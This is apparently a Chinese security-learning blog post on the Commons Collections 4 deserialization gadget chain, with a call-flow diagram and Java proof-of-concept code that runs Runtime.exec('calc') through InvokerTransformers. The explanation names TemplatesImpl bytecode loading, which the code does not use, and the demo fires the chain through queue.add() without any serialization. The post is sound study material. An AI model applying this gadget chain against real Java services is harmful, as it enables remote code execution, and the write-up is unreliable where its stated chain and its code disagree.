+++
title = "CC链子4"
date = 2026-06-14T23:45:00+08:00
draft = false
description = "由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。"
tags = ["Java安全", "安全研究"]
categories = ["安全研究"]
series = ["Java 安全 持续学习"]
pin = false
cover = "/images/posts/java-security-banner.svg"
+++
## 前言

由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。这篇文章收录在「Java 安全 持续学习」系列中，用来沉淀对应主题的分析与记录。

## 原理

- **依赖**：`commons-collections4:4.0`
    
- **入口**：`PriorityQueue.readObject()`
    
- **执行**：`TemplatesImpl.newTransformer()` 加载字节码
    
- **原理**：结合了 CC2 的触发方式（`PriorityQueue`）和 CC3 的利用逻辑（通过 `ChainedTransformer` 调用 `TemplatesImpl`）。
    
- **流程**： 
- `PriorityQueue.readObject()`
- ↓ `TransformingComparator.compare()`
- ↓ `ChainedTransformer.transform()`
- ↓ `ConstantTransformer` + `InstantiatingTransformer`
- ↓ `TemplatesImpl.newTransformer()` 
- ↓ 恶意类加载执行



## 过程


弹计算机

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260613172244790.png)


源码

```java
package cc4;

  

import org.apache.commons.collections4.Transformer;

import org.apache.commons.collections4.comparators.TransformingComparator;

import org.apache.commons.collections4.functors.ChainedTransformer;

import org.apache.commons.collections4.functors.ConstantTransformer;

import org.apache.commons.collections4.functors.InvokerTransformer;

  

import java.util.Comparator;

import java.util.PriorityQueue;

  

/**

 * CC4 - PriorityQueue + ChainedTransformer + Runtime.exec()

 */

public class CC4Calc {

  

    public static void main(String[] args) throws Exception {

        System.out.println("CC4 Chain - Calculator");

        System.out.println("=====================\n");

  

        // Transformer chain: Runtime.class -> getRuntime() -> exec("calc")

        Transformer[] transformers = new Transformer[]{

            new ConstantTransformer(Runtime.class),

            new InvokerTransformer("getMethod",

                new Class[]{String.class, Class[].class},

                new Object[]{"getRuntime", new Class[0]}),

            new InvokerTransformer("invoke",

                new Class[]{Object.class, Object[].class},

                new Object[]{null, new Object[0]}),

            new InvokerTransformer("exec",

                new Class[]{String.class},

                new Object[]{"calc"})

        };

  

        ChainedTransformer chain = new ChainedTransformer(transformers);

  

        // Use a dummy comparator that always returns 0

        // This avoids ClassCastException when comparing Process objects

        Comparator dummyComparator = new Comparator() {

            @Override

            public int compare(Object o1, Object o2) {

                return 0;

            }

        };

  

        // PriorityQueue with TransformingComparator

        TransformingComparator comparator = new TransformingComparator(chain, dummyComparator);

        PriorityQueue queue = new PriorityQueue(2, comparator);

  

        // Trigger: add() -> compare() -> transform() -> exec()

        System.out.println("[*] Press Enter to trigger...");

        System.in.read();

  

        queue.add(1);

        queue.add(2);

  

        System.out.println("[+] Done! Calculator should pop up!");

    }

}
```


## 总结


PriorityQueue.readObject()
      ↓
  PriorityQueue.heapify() → siftDown()
      ↓
  TransformingComparator.compare()
      ↓
  ChainedTransformer.transform()
      ↓
  Runtime.getRuntime().exec("calc")
